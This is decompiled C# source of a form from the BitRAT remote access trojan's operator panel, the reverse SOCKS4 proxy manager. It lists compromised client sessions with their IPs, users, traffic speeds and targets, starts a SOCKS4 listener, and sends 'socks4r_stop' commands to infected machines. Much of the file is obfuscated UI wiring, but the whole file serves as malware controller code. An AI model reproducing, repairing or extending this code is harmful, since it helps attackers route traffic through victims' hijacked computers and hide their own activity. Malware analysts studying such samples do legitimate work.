﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x0200019F RID: 415
[DesignerGenerated]
public sealed partial class fSocks4R : Form
{
	// Token: 0x060016E8 RID: 5864 RVA: 0x000A9CD4 File Offset: 0x000A7ED4
	public fSocks4R()
	{
		base.Load += this.fSocks4R_Load;
		base.Closing += this.fSocks4R_Closing;
		this.concurrentStack_0 = new ConcurrentStack<cSocks4Rcli>();
		this.concurrentStack_1 = new ConcurrentStack<cSocks4Rcli>();
		this.concurrentStack_2 = new ConcurrentStack<cSocks4Rcli>();
		this.InitializeComponent();
	}

	// Token: 0x060016EB RID: 5867 RVA: 0x0000BEA6 File Offset: 0x0000A0A6
	internal VisualButton vmethod_0()
	{
		return this.visualButton_0;
	}

	// Token: 0x060016EC RID: 5868 RVA: 0x000AADC8 File Offset: 0x000A8FC8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(VisualButton visualButton_1)
	{
		EventHandler value = new EventHandler(this.method_8);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_1;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x060016ED RID: 5869 RVA: 0x0000BEAE File Offset: 0x0000A0AE
	internal BackgroundWorker vmethod_2()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x060016EE RID: 5870 RVA: 0x000AAE0C File Offset: 0x000A900C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(BackgroundWorker backgroundWorker_1)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_9);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_1;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x060016EF RID: 5871 RVA: 0x0000BEB6 File Offset: 0x0000A0B6
	internal ToolStripMenuItem vmethod_4()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x060016F0 RID: 5872 RVA: 0x000AAE50 File Offset: 0x000A9050
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_16);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_0 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_0;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060016F1 RID: 5873 RVA: 0x0000BEBE File Offset: 0x0000A0BE
	internal ToolStripMenuItem vmethod_6()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x060016F2 RID: 5874 RVA: 0x000AAE94 File Offset: 0x000A9094
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_15);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_1 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060016F3 RID: 5875 RVA: 0x0000BEC6 File Offset: 0x0000A0C6
	internal ToolStripSeparator vmethod_8()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x060016F4 RID: 5876 RVA: 0x0000BECE File Offset: 0x0000A0CE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(ToolStripSeparator toolStripSeparator_4)
	{
		this.toolStripSeparator_0 = toolStripSeparator_4;
	}

	// Token: 0x060016F5 RID: 5877 RVA: 0x0000BED7 File Offset: 0x0000A0D7
	internal ToolStripMenuItem vmethod_10()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x060016F6 RID: 5878 RVA: 0x000AAED8 File Offset: 0x000A90D8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_14);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_2 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_2;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060016F7 RID: 5879 RVA: 0x0000BEDF File Offset: 0x0000A0DF
	internal ToolStripMenuItem vmethod_12()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x060016F8 RID: 5880 RVA: 0x0000BEE7 File Offset: 0x0000A0E7
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(ToolStripMenuItem toolStripMenuItem_8)
	{
		this.toolStripMenuItem_3 = toolStripMenuItem_8;
	}

	// Token: 0x060016F9 RID: 5881 RVA: 0x0000BEF0 File Offset: 0x0000A0F0
	internal ToolStripSeparator vmethod_14()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x060016FA RID: 5882 RVA: 0x0000BEF8 File Offset: 0x0000A0F8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(ToolStripSeparator toolStripSeparator_4)
	{
		this.toolStripSeparator_1 = toolStripSeparator_4;
	}

	// Token: 0x060016FB RID: 5883 RVA: 0x0000BF01 File Offset: 0x0000A101
	internal ToolStripMenuItem vmethod_16()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x060016FC RID: 5884 RVA: 0x000AAF1C File Offset: 0x000A911C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_13);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060016FD RID: 5885 RVA: 0x0000BF09 File Offset: 0x0000A109
	internal ToolStripMenuItem vmethod_18()
	{
		return this.toolStripMenuItem_5;
	}

	// Token: 0x060016FE RID: 5886 RVA: 0x0000BF11 File Offset: 0x0000A111
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(ToolStripMenuItem toolStripMenuItem_8)
	{
		this.toolStripMenuItem_5 = toolStripMenuItem_8;
	}

	// Token: 0x060016FF RID: 5887 RVA: 0x0000BF1A File Offset: 0x0000A11A
	internal ContextMenuStrip vmethod_20()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06001700 RID: 5888 RVA: 0x0000BF22 File Offset: 0x0000A122
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06001701 RID: 5889 RVA: 0x0000BF2B File Offset: 0x0000A12B
	internal OLVColumn vmethod_22()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x06001702 RID: 5890 RVA: 0x0000BF33 File Offset: 0x0000A133
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_0 = olvcolumn_9;
	}

	// Token: 0x06001703 RID: 5891 RVA: 0x0000BF3C File Offset: 0x0000A13C
	internal PictureBox vmethod_24()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06001704 RID: 5892 RVA: 0x000AAF60 File Offset: 0x000A9160
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_19);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_3;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001705 RID: 5893 RVA: 0x0000BF44 File Offset: 0x0000A144
	internal OLVColumn vmethod_26()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x06001706 RID: 5894 RVA: 0x0000BF4C File Offset: 0x0000A14C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_1 = olvcolumn_9;
	}

	// Token: 0x06001707 RID: 5895 RVA: 0x0000BF55 File Offset: 0x0000A155
	internal OLVColumn vmethod_28()
	{
		return this.olvcolumn_2;
	}

	// Token: 0x06001708 RID: 5896 RVA: 0x0000BF5D File Offset: 0x0000A15D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_2 = olvcolumn_9;
	}

	// Token: 0x06001709 RID: 5897 RVA: 0x0000BF66 File Offset: 0x0000A166
	internal OLVColumn vmethod_30()
	{
		return this.olvcolumn_3;
	}

	// Token: 0x0600170A RID: 5898 RVA: 0x0000BF6E File Offset: 0x0000A16E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_3 = olvcolumn_9;
	}

	// Token: 0x0600170B RID: 5899 RVA: 0x0000BF77 File Offset: 0x0000A177
	internal OLVColumn vmethod_32()
	{
		return this.olvcolumn_4;
	}

	// Token: 0x0600170C RID: 5900 RVA: 0x0000BF7F File Offset: 0x0000A17F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_4 = olvcolumn_9;
	}

	// Token: 0x0600170D RID: 5901 RVA: 0x0000BF88 File Offset: 0x0000A188
	internal OLVColumn vmethod_34()
	{
		return this.olvcolumn_5;
	}

	// Token: 0x0600170E RID: 5902 RVA: 0x0000BF90 File Offset: 0x0000A190
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_5 = olvcolumn_9;
	}

	// Token: 0x0600170F RID: 5903 RVA: 0x0000BF99 File Offset: 0x0000A199
	internal OLVColumn vmethod_36()
	{
		return this.olvcolumn_6;
	}

	// Token: 0x06001710 RID: 5904 RVA: 0x0000BFA1 File Offset: 0x0000A1A1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_6 = olvcolumn_9;
	}

	// Token: 0x06001711 RID: 5905 RVA: 0x0000BFAA File Offset: 0x0000A1AA
	internal OLVColumn vmethod_38()
	{
		return this.olvcolumn_7;
	}

	// Token: 0x06001712 RID: 5906 RVA: 0x0000BFB2 File Offset: 0x0000A1B2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_7 = olvcolumn_9;
	}

	// Token: 0x06001713 RID: 5907 RVA: 0x0000BFBB File Offset: 0x0000A1BB
	internal ToolStripStatusLabel vmethod_40()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x06001714 RID: 5908 RVA: 0x0000BFC3 File Offset: 0x0000A1C3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(ToolStripStatusLabel toolStripStatusLabel_2)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_2;
	}

	// Token: 0x06001715 RID: 5909 RVA: 0x0000BFCC File Offset: 0x0000A1CC
	internal StatusStrip vmethod_42()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06001716 RID: 5910 RVA: 0x0000BFD4 File Offset: 0x0000A1D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x06001717 RID: 5911 RVA: 0x0000BFDD File Offset: 0x0000A1DD
	internal System.Windows.Forms.Timer vmethod_44()
	{
		return this.timer_0;
	}

	// Token: 0x06001718 RID: 5912 RVA: 0x000AAFA4 File Offset: 0x000A91A4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(System.Windows.Forms.Timer timer_1)
	{
		EventHandler value = new EventHandler(this.method_11);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_1;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06001719 RID: 5913 RVA: 0x0000BFE5 File Offset: 0x0000A1E5
	internal OLVColumn vmethod_46()
	{
		return this.olvcolumn_8;
	}

	// Token: 0x0600171A RID: 5914 RVA: 0x0000BFED File Offset: 0x0000A1ED
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_8 = olvcolumn_9;
	}

	// Token: 0x0600171B RID: 5915 RVA: 0x0000BFF6 File Offset: 0x0000A1F6
	internal FastObjectListView vmethod_48()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x0600171C RID: 5916 RVA: 0x000AAFE8 File Offset: 0x000A91E8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(FastObjectListView fastObjectListView_1)
	{
		KeyEventHandler value = new KeyEventHandler(this.method_10);
		EventHandler<FormatRowEventArgs> eventHandler = new EventHandler<FormatRowEventArgs>(this.method_12);
		FastObjectListView fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.KeyDown -= value;
			fastObjectListView.FormatRow -= eventHandler;
		}
		this.fastObjectListView_0 = fastObjectListView_1;
		fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.KeyDown += value;
			fastObjectListView.FormatRow += eventHandler;
		}
	}

	// Token: 0x0600171D RID: 5917 RVA: 0x0000BFFE File Offset: 0x0000A1FE
	internal ToolStripStatusLabel vmethod_50()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x0600171E RID: 5918 RVA: 0x0000C006 File Offset: 0x0000A206
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(ToolStripStatusLabel toolStripStatusLabel_2)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_2;
	}

	// Token: 0x0600171F RID: 5919 RVA: 0x0000C00F File Offset: 0x0000A20F
	internal ToolStripSeparator vmethod_52()
	{
		return this.toolStripSeparator_2;
	}

	// Token: 0x06001720 RID: 5920 RVA: 0x0000C017 File Offset: 0x0000A217
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(ToolStripSeparator toolStripSeparator_4)
	{
		this.toolStripSeparator_2 = toolStripSeparator_4;
	}

	// Token: 0x06001721 RID: 5921 RVA: 0x0000C020 File Offset: 0x0000A220
	internal ToolStripMenuItem vmethod_54()
	{
		return this.toolStripMenuItem_6;
	}

	// Token: 0x06001722 RID: 5922 RVA: 0x000AB048 File Offset: 0x000A9248
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_17);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_6 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001723 RID: 5923 RVA: 0x0000C028 File Offset: 0x0000A228
	internal ToolStripMenuItem vmethod_56()
	{
		return this.toolStripMenuItem_7;
	}

	// Token: 0x06001724 RID: 5924 RVA: 0x000AB08C File Offset: 0x000A928C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(ToolStripMenuItem toolStripMenuItem_8)
	{
		EventHandler value = new EventHandler(this.method_18);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_7 = toolStripMenuItem_8;
		toolStripMenuItem = this.toolStripMenuItem_7;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001725 RID: 5925 RVA: 0x0000C030 File Offset: 0x0000A230
	internal ToolStripSeparator vmethod_58()
	{
		return this.toolStripSeparator_3;
	}

	// Token: 0x06001726 RID: 5926 RVA: 0x0000C038 File Offset: 0x0000A238
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(ToolStripSeparator toolStripSeparator_4)
	{
		this.toolStripSeparator_3 = toolStripSeparator_4;
	}

	// Token: 0x06001727 RID: 5927 RVA: 0x0000C041 File Offset: 0x0000A241
	internal PictureBox vmethod_60()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06001728 RID: 5928 RVA: 0x000AB0D0 File Offset: 0x000A92D0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_21);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_3;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001729 RID: 5929 RVA: 0x0000C049 File Offset: 0x0000A249
	internal PictureBox vmethod_62()
	{
		return this.pictureBox_2;
	}

	// Token: 0x0600172A RID: 5930 RVA: 0x000AB114 File Offset: 0x000A9314
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(PictureBox pictureBox_3)
	{
		EventHandler value = new EventHandler(this.method_20);
		PictureBox pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_2 = pictureBox_3;
		pictureBox = this.pictureBox_2;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x0600172B RID: 5931 RVA: 0x000AB158 File Offset: 0x000A9358
	private void fSocks4R_Load(object sender, EventArgs e)
	{
		this.vmethod_48().VirtualMode = true;
		this.vmethod_48().View = View.Details;
		this.vmethod_48().FullRowSelect = true;
		this.vmethod_48().OwnerDraw = true;
		this.vmethod_48().Columns[0].Width = 180;
		this.vmethod_48().Columns[1].Width = 100;
		this.vmethod_48().Columns[2].Width = 50;
		this.vmethod_48().Columns[3].Width = 80;
		this.vmethod_48().Columns[4].Width = 80;
		this.vmethod_48().Columns[5].Width = 80;
		this.vmethod_48().Columns[6].Width = 80;
		this.vmethod_48().Columns[7].Width = 120;
		this.vmethod_48().Columns[8].Width = 80;
		this.vmethod_48().GridLines = Class135.smethod_0().Gridlines;
		this.vmethod_2().RunWorkerAsync();
	}

	// Token: 0x0600172C RID: 5932 RVA: 0x000AB290 File Offset: 0x000A9490
	public void method_0(string string_0, string string_1, string string_2, string string_3)
	{
		if (this.vmethod_48().InvokeRequired)
		{
			this.vmethod_48().Invoke(new fSocks4R.Delegate166(this.method_0), new object[]
			{
				string_0,
				string_1,
				string_2,
				string_3
			});
			return;
		}
		if (!Class130.concurrentDictionary_7.ContainsKey(string_0))
		{
			cSocks4Rcli cSocks4Rcli = new cSocks4Rcli();
			cSocks4Rcli.IP = string_2;
			cSocks4Rcli.USER = string_1;
			cSocks4Rcli.Key = string_0;
			cSocks4Rcli.PORT = string_3;
			cSocks4Rcli.DURATION = Class136.smethod_35(0L, true);
			cSocks4Rcli.bJustConnected = true;
			if (Conversion.Val(string_3) == 0.0)
			{
				cSocks4Rcli.pending_dc = true;
			}
			Class130.concurrentDictionary_7.TryAdd(string_0, cSocks4Rcli);
			Class130.concurrentDictionary_7[string_0].Key = string_0;
			this.concurrentStack_0.Push(cSocks4Rcli);
		}
	}

	// Token: 0x0600172D RID: 5933 RVA: 0x000AB36C File Offset: 0x000A956C
	public void method_1(string string_0)
	{
		if (Class130.concurrentDictionary_7.ContainsKey(string_0))
		{
			if (this.vmethod_48().InvokeRequired)
			{
				this.vmethod_48().Invoke(new fSocks4R.Delegate165(this.method_1), new object[]
				{
					string_0
				});
				return;
			}
			try
			{
				this.concurrentStack_2.Push(Class130.concurrentDictionary_7[string_0]);
				ConcurrentDictionary<string, cSocks4Rcli> concurrentDictionary_ = Class130.concurrentDictionary_7;
				cSocks4Rcli cSocks4Rcli = null;
				concurrentDictionary_.TryRemove(string_0, out cSocks4Rcli);
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600172E RID: 5934 RVA: 0x000AB400 File Offset: 0x000A9600
	public void method_2(string string_0, string[] string_1)
	{
		if (Class130.concurrentDictionary_7.ContainsKey(string_0))
		{
			if (this.vmethod_48().InvokeRequired)
			{
				this.vmethod_48().Invoke(new fSocks4R.Delegate161(this.method_2), new object[]
				{
					string_0,
					string_1
				});
				return;
			}
			try
			{
				Class130.concurrentDictionary_7[string_0].USER = string_1[0];
				Class130.concurrentDictionary_7[string_0].IP = string_1[1];
				Class130.concurrentDictionary_7[string_0].PORT = string_1[2];
				cSocks4Rcli cSocks4Rcli = Class130.concurrentDictionary_7[string_0];
				ref double ptr = ref cSocks4Rcli.dRecv;
				cSocks4Rcli.dRecv = ptr + Conversion.Val(string_1[3]);
				cSocks4Rcli cSocks4Rcli2 = Class130.concurrentDictionary_7[string_0];
				ptr = ref cSocks4Rcli2.dSent;
				cSocks4Rcli2.dSent = ptr + Conversion.Val(string_1[4]);
				cSocks4Rcli cSocks4Rcli3 = Class130.concurrentDictionary_7[string_0];
				int num = (Operators.CompareString(string_1[3], string.Empty, true) == 0) ? 1 : 0;
				string text = "N/A";
				double num2 = Conversions.ToDouble(string_1[3]);
				bool flag = false;
				ref bool ptr2 = ref flag;
				double num3 = num2;
				string truePart = text;
				int expression = num;
				cSocks4Rcli cSocks4Rcli4 = cSocks4Rcli3;
				int num4;
				string text3;
				int num5;
				object obj;
				try
				{
					ProjectData.ClearProjectError();
					num4 = 2;
					string text2 = string.Empty;
					if (num3 >= 1099511627776.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num3 >= 1073741824.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num3 >= 1048576.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num3 >= 1024.0)
					{
						text2 = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
					}
					else if (num3 < 1024.0)
					{
						text2 = Conversions.ToString(Conversion.Fix(num3)) + " B";
					}
					if (ptr2)
					{
						text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
					}
					if (text2.Length > 0)
					{
						text3 = text2;
					}
					else
					{
						text3 = " 0 B";
					}
					IL_260:
					goto IL_2B0;
					IL_262:
					text3 = "0 B";
					goto IL_260;
					IL_26B:
					num5 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
					IL_281:;
				}
				catch when (endfilter(obj is Exception & num4 != 0 & num5 == 0))
				{
					Exception ex = (Exception)obj2;
					goto IL_26B;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_2B0:
				if (num5 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string str = text3;
				cSocks4Rcli4.SPEED_DL = Conversions.ToString(Interaction.IIf(expression != 0, truePart, str + "/s"));
				cSocks4Rcli cSocks4Rcli5 = Class130.concurrentDictionary_7[string_0];
				int num6 = (Operators.CompareString(string_1[4], string.Empty, true) == 0) ? 1 : 0;
				string text4 = "N/A";
				double num7 = Conversions.ToDouble(string_1[4]);
				flag = false;
				ptr2 = ref flag;
				num3 = num7;
				string truePart2 = text4;
				int expression2 = num6;
				cSocks4Rcli cSocks4Rcli6 = cSocks4Rcli5;
				object obj3;
				try
				{
					ProjectData.ClearProjectError();
					num4 = 2;
					string text2 = string.Empty;
					if (num3 >= 1099511627776.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num3 >= 1073741824.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num3 >= 1048576.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num3 >= 1024.0)
					{
						text2 = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
					}
					else if (num3 < 1024.0)
					{
						text2 = Conversions.ToString(Conversion.Fix(num3)) + " B";
					}
					if (ptr2)
					{
						text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
					}
					if (text2.Length > 0)
					{
						text3 = text2;
					}
					else
					{
						text3 = " 0 B";
					}
					IL_484:
					goto IL_4D4;
					IL_486:
					text3 = "0 B";
					goto IL_484;
					IL_48F:
					num5 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
					IL_4A5:;
				}
				catch when (endfilter(obj3 is Exception & num4 != 0 & num5 == 0))
				{
					Exception ex2 = (Exception)obj4;
					goto IL_48F;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_4D4:
				if (num5 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string str2 = text3;
				cSocks4Rcli6.SPEED_UL = Conversions.ToString(Interaction.IIf(expression2 != 0, truePart2, str2 + "/s"));
				Class130.concurrentDictionary_7[string_0].TARGET = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[5], string.Empty, true) == 0, "N/A", string_1[5]));
				Class130.concurrentDictionary_7[string_0].DURATION = Class136.smethod_35(checked((long)Math.Round(Conversion.Val(string_1[6]) / 1000.0)), true);
				Class130.concurrentDictionary_7[string_0].bJustConnected = false;
				this.concurrentStack_1.Push(Class130.concurrentDictionary_7[string_0]);
			}
			catch (Exception ex3)
			{
			}
		}
	}

	// Token: 0x0600172F RID: 5935 RVA: 0x000AB9F4 File Offset: 0x000A9BF4
	public void method_3()
	{
		if (this.vmethod_48().InvokeRequired)
		{
			this.vmethod_48().Invoke(new fSocks4R.Delegate164(this.method_3), new object[0]);
			return;
		}
		if (this.concurrentStack_0.Count > 0)
		{
			this.vmethod_48().AddObjects(this.concurrentStack_0.ToList<cSocks4Rcli>());
			this.concurrentStack_0.Clear();
		}
	}

	// Token: 0x06001730 RID: 5936 RVA: 0x000ABA5C File Offset: 0x000A9C5C
	public void method_4()
	{
		if (this.vmethod_48().InvokeRequired)
		{
			this.vmethod_48().Invoke(new fSocks4R.Delegate163(this.method_4), new object[0]);
			return;
		}
		if (this.concurrentStack_1.Count > 0)
		{
			this.vmethod_48().RefreshObjects(this.concurrentStack_1.ToList<cSocks4Rcli>());
			this.concurrentStack_1.Clear();
		}
	}

	// Token: 0x06001731 RID: 5937 RVA: 0x000ABAC4 File Offset: 0x000A9CC4
	public void method_5()
	{
		if (this.vmethod_48().InvokeRequired)
		{
			this.vmethod_48().Invoke(new fSocks4R.Delegate162(this.method_5), new object[0]);
			return;
		}
		if (this.concurrentStack_2.Count > 0)
		{
			this.vmethod_48().RemoveObjects(this.concurrentStack_2.ToList<cSocks4Rcli>());
			this.concurrentStack_2.Clear();
		}
	}

	// Token: 0x06001732 RID: 5938 RVA: 0x000ABB2C File Offset: 0x000A9D2C
	public void method_6()
	{
		Class130.struct18_2.method_1(true);
		this.cSocks4Server_0 = new cSocks4Server();
		if (this.cSocks4Server_0.Start(0) == 0 & this.cSocks4Server_0.MSG_START_ERR.Length > 0)
		{
			Interaction.MsgBox("Failed while attempting to start socket!\r\nError: " + this.cSocks4Server_0.MSG_START_ERR, MsgBoxStyle.Critical, Application.ProductName);
			Class130.struct18_2.method_1(false);
		}
		this.vmethod_0().Text = "Stop";
		this.vmethod_0().Enabled = true;
	}

	// Token: 0x06001733 RID: 5939 RVA: 0x000ABBC0 File Offset: 0x000A9DC0
	public void method_7()
	{
		Class130.struct18_2.method_1(false);
		try
		{
			Class130.socket_0.Shutdown(SocketShutdown.Both);
		}
		catch (Exception ex)
		{
		}
		Class130.socket_0.Close();
		this.cSocks4Server_0 = null;
		FastObjectListView fastObjectListView = this.vmethod_48();
		try
		{
			foreach (object obj in fastObjectListView.Objects)
			{
				string key = ((cSocks4Rcli)obj).Key;
				string string_ = "socks4r_stop|1";
				string string_2 = key;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
